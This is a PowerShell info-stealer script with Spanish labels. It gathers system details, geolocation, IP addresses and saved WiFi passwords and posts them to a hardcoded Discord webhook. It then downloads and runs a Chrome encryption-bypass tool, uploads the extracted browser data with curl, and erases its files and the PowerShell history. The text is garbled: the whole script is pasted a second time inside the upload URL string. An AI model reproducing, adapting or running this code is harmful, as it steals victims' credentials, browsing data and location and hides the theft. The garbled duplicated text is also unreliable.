[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$webhook = 'https://discord.com/api/webhooks/1504878721935474779/b4dgmFw2ay7hINlZBiWp-u7oRXXpftFk-umegXkwgmabQCg8l-avauoyk78OlQBZOmmW'
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$privilegios = if ($isAdmin) { "ADMINISTRADOR (Acceso Total)" } else { "ESTANDAR (Acceso Limitado a WiFi)" }
$geo = Invoke-RestMethod -Uri 'http://ip-api.com/json' -UseBasicParsing
$lat = $geo.lat.ToString().Replace(',', '.')
$lon = $geo.lon.ToString().Replace(',', '.')
$loc = "$($geo.city), $($geo.country) ($lat, $lon)"
$ip_pub = $geo.query
$ni = netsh wlan show int
$active = ($ni | Select-String '\bSSID\b' | Select-Object -First 1).Line.Split(':')[1].Trim()
$bss = ($ni | Select-String 'BSSID' | Select-Object -First 1).Line.Split(':', 2)[1].Trim()
$ip_p = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -match 'Wi-Fi|Ethernet' }).IPv4Address | Select-Object -First 1
$os = (Get-CimInstance Win32_OperatingSystem).Caption + ' ' + (Get-CimInstance Win32_OperatingSystem).OSArchitecture
$table = (Get-HotFix | Select-Object -Last 4 | Out-String).Trim()
$map = "https://www.google.com/maps/search/?api=1&query=$lat,$lon"
$head  = "---------------------------------------`n"
$head += "EQUIPO: $($env:COMPUTERNAME) | USER: $($env:USERNAME)`n"
$head += "ROL: $privilegios`n"
$head += "SO: $os`n"
$head += "UBICACION: $loc`n"
$head += "MAPS: $map`n"
$head += "IP PRIV: $ip_p | PUB: $ip_pub`n"
$head += "CONECTADO A: $active ($bss)`n"
$head += "HOTFIX:`n$table`n"
$ns = netsh wlan show prof | Select-String ':\s+(.*)' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() } | Where-Object { $_ -notmatch 'Perfil|Profile' }
$res = ''
foreach ($n in $ns) {
    $pw = netsh wlan show prof name="$n" key=clear | Select-String 'Contenido|Key'
    if ($pw) {
        $v = $pw.Line.Split(':')[1].Trim()
        $res += "WiFi: $n | Clave: $v`n"
    } else {
        $res += "WiFi: $n | (Sin clave o requiere Admin)`n"
    }
}
$payload = @{
    content = $head + "`n**WIFI:**`n" + $res + "---------------------------------------"
} | ConvertTo-Json -Compress
Invoke-RestMethod -Uri $webhook -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -ContentType 'application/json'
mkdir "$env:TEMP\work" -Force; cd "$env:TEMP\work"
iwr -Uri "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip" -OutFile "data.zip" -UseBasicParsing
Expand-Archive -Path "data.zip" -DestinationPath "ext" -Force
cd ext
.\chromelevator_x64.exe all -f -o out
Compress-Archive -Path "out\*" -DestinationPath "cosa.zip" -Force
curl.exe -F "file=@cosa.zip" "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$webhook = 'https://discord.com/api/webhooks/1504878721935474779/b4dgmFw2ay7hINlZBiWp-u7oRXXpftFk-umegXkwgmabQCg8l-avauoyk78OlQBZOmmW'
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$privilegios = if ($isAdmin) { "ADMINISTRADOR (Acceso Total)" } else { "ESTANDAR (Acceso Limitado a WiFi)" }
$geo = Invoke-RestMethod -Uri 'http://ip-api.com/json' -UseBasicParsing
$lat = $geo.lat.ToString().Replace(',', '.')
$lon = $geo.lon.ToString().Replace(',', '.')
$loc = "$($geo.city), $($geo.country) ($lat, $lon)"
$ip_pub = $geo.query
$ni = netsh wlan show int
$active = ($ni | Select-String '\bSSID\b' | Select-Object -First 1).Line.Split(':')[1].Trim()
$bss = ($ni | Select-String 'BSSID' | Select-Object -First 1).Line.Split(':', 2)[1].Trim()
$ip_p = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -match 'Wi-Fi|Ethernet' }).IPv4Address | Select-Object -First 1
$os = (Get-CimInstance Win32_OperatingSystem).Caption + ' ' + (Get-CimInstance Win32_OperatingSystem).OSArchitecture
$table = (Get-HotFix | Select-Object -Last 4 | Out-String).Trim()
$map = "https://www.google.com/maps/search/?api=1&query=$lat,$lon"
$head  = "---------------------------------------`n"
$head += "EQUIPO: $($env:COMPUTERNAME) | USER: $($env:USERNAME)`n"
$head += "ROL: $privilegios`n"
$head += "SO: $os`n"
$head += "UBICACION: $loc`n"
$head += "MAPS: $map`n"
$head += "IP PRIV: $ip_p | PUB: $ip_pub`n"
$head += "CONECTADO A: $active ($bss)`n"
$head += "HOTFIX:`n$table`n"
$ns = netsh wlan show prof | Select-String ':\s+(.*)' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() } | Where-Object { $_ -notmatch 'Perfil|Profile' }
$res = ''
foreach ($n in $ns) {
    $pw = netsh wlan show prof name="$n" key=clear | Select-String 'Contenido|Key'
    if ($pw) {
        $v = $pw.Line.Split(':')[1].Trim()
        $res += "WiFi: $n | Clave: $v`n"
    } else {
        $res += "WiFi: $n | (Sin clave o requiere Admin)`n"
    }
}
$payload = @{
    content = $head + "`n**WIFI:**`n" + $res + "---------------------------------------"
} | ConvertTo-Json -Compress
Invoke-RestMethod -Uri $webhook -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -ContentType 'application/json'
mkdir "$env:TEMP\work" -Force; cd "$env:TEMP\work"
iwr -Uri "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip" -OutFile "data.zip" -UseBasicParsing
Expand-Archive -Path "data.zip" -DestinationPath "ext" -Force
cd ext
.\chromelevator_x64.exe all -f -o out
Compress-Archive -Path "out\*" -DestinationPath "cosa.zip" -Force
curl.exe -F "file=@cosa.zip" "WEBHOOK_HERE"
cd $env:TEMP; rm -Recurse -Force "$env:TEMP\work"
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History
exit"
cd $env:TEMP; rm -Recurse -Force "$env:TEMP\work"
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History
exit
